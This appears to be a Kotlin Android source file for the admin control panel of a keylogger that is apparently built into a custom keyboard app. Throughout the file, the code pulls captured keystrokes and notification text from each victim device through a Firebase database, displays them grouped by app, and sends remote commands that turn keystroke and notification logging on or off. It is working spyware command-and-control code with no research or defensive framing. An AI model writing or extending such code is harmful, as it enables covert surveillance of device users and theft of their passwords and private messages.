package com.example.mykeyboardadmin

import android.graphics.Color
import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.google.firebase.FirebaseApp
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener

class AdminMainActivity : AppCompatActivity() {

    private lateinit var recyclerView: RecyclerView
    private val deviceList = mutableListOf<DeviceModel>()
    private lateinit var adapter: DeviceAdapter

    data class DeviceModel(
        val name: String,
        var keylogging: Boolean = true,
        var notifications: Boolean = true,
        var logFeed: String = "Connecting..."
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        try {
            FirebaseApp.initializeApp(this)
        } catch (e: Exception) {
            e.printStackTrace()
        }
        setContentView(R.layout.activity_admin_main)

        recyclerView = findViewById(R.id.recyclerViewDevices)
        recyclerView.layoutManager = LinearLayoutManager(this)
        adapter = DeviceAdapter(deviceList) { device, type, newState ->
            val ref = FirebaseDatabase.getInstance().getReference("admin_commands").child(device.name)
            if (type == "key") {
                device.keylogging = newState
                ref.child("keylogging").setValue(newState)
                ref.child("status").child("keylogging").setValue(newState)
            } else {
                device.notifications = newState
                ref.child("notifications").setValue(newState)
                ref.child("status").child("notifications").setValue(newState)
            }
            adapter.notifyDataSetChanged()
        }
        recyclerView.adapter = adapter

        loadConnectedDevices()
    }

    private fun loadConnectedDevices() {
        val dbRef = FirebaseDatabase.getInstance().getReference("keystrokes_batches")
        dbRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                for (child in snapshot.children) {
                    val deviceName = child.key ?: continue
                    if (deviceList.none { it.name == deviceName }) {
                        val device = DeviceModel(deviceName)
                        deviceList.add(device)
                        listenToDeviceState(deviceName)
                        listenToDeviceLogs(deviceName)
                    }
                }
                adapter.notifyDataSetChanged()
            }

            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private fun listenToDeviceState(deviceName: String) {
        val cmdRef = FirebaseDatabase.getInstance().getReference("admin_commands").child(deviceName)
        cmdRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val key = snapshot.child("status").child("keylogging").getValue(Boolean::class.java)
                    ?: snapshot.child("keylogging").getValue(Boolean::class.java) ?: true
                val notif = snapshot.child("status").child("notifications").getValue(Boolean::class.java)
                    ?: snapshot.child("notifications").getValue(Boolean::class.java) ?: true

                val index = deviceList.indexOfFirst { it.name == deviceName }
                if (index != -1) {
                    deviceList[index].keylogging = key
                    deviceList[index].notifications = notif
                    adapter.notifyItemChanged(index)
                }
            }

            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private fun listenToDeviceLogs(deviceName: String) {
        val logRef = FirebaseDatabase.getInstance().getReference("keystrokes_batches").child(deviceName)
        logRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val sb = StringBuilder()
                for (appChild in snapshot.children) {
                    val appName = appChild.key ?: continue
                    for (entry in appChild.children) {
                        val text = entry.child("text").getValue(String::class.java)
                            ?: entry.child("title").getValue(String::class.java)
                            ?: entry.child("typedContent").getValue(String::class.java)
                            ?: continue

                        if (text.isNotBlank() && text != "null") {
                            sb.append("[$appName] $text\n")
                        }
                    }
                }
                val index = deviceList.indexOfFirst { it.name == deviceName }
                if (index != -1) {
                    deviceList[index].logFeed = if (sb.isNotEmpty()) sb.toString() else "No recent activity."
                    adapter.notifyItemChanged(index)
                }
            }

            override fun onCancelled(error: DatabaseError) {}
        })
    }

    class DeviceAdapter(
        private val devices: List<DeviceModel>,
        private val onToggle: (DeviceModel, String, Boolean) -> Unit
    ) : RecyclerView.Adapter<DeviceAdapter.ViewHolder>() {

        class ViewHolder(view: View) : RecyclerView.ViewHolder(view) {
            val txtName: TextView = view.findViewById(R.id.txtDeviceName)
            val btnKey: Button = view.findViewById(R.id.btnToggleKeyLog)
            val btnNotif: Button = view.findViewById(R.id.btnToggleNotifLog)
            val txtLog: TextView = view.findViewById(R.id.txtDeviceLogConsole)
        }

        override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): ViewHolder {
            val view = LayoutInflater.from(parent.context).inflate(R.layout.item_device_control, parent, false)
            return ViewHolder(view)
        }

        override fun onBindViewHolder(holder: ViewHolder, position: Int) {
            val device = devices[position]
            holder.txtName.text = "📱 Device: ${device.name}"

            if (device.keylogging) {
                holder.btnKey.text = "Key Logger: ON"
                holder.btnKey.setBackgroundColor(Color.parseColor("#388E3C"))
            } else {
                holder.btnKey.text = "Key Logger: OFF"
                holder.btnKey.setBackgroundColor(Color.parseColor("#C62828"))
            }

            if (device.notifications) {
                holder.btnNotif.text = "Notif Logger: ON"
                holder.btnNotif.setBackgroundColor(Color.parseColor("#388E3C"))
            } else {
                holder.btnNotif.text = "Notif Logger: OFF"
                holder.btnNotif.setBackgroundColor(Color.parseColor("#C62828"))
            }

            holder.txtLog.text = device.logFeed

            holder.btnKey.setOnClickListener {
                onToggle(device, "key", !device.keylogging)
            }

            holder.btnNotif.setOnClickListener {
                onToggle(device, "notif", !device.notifications)
            }
        }

        override fun getItemCount() = devices.size
    }
}
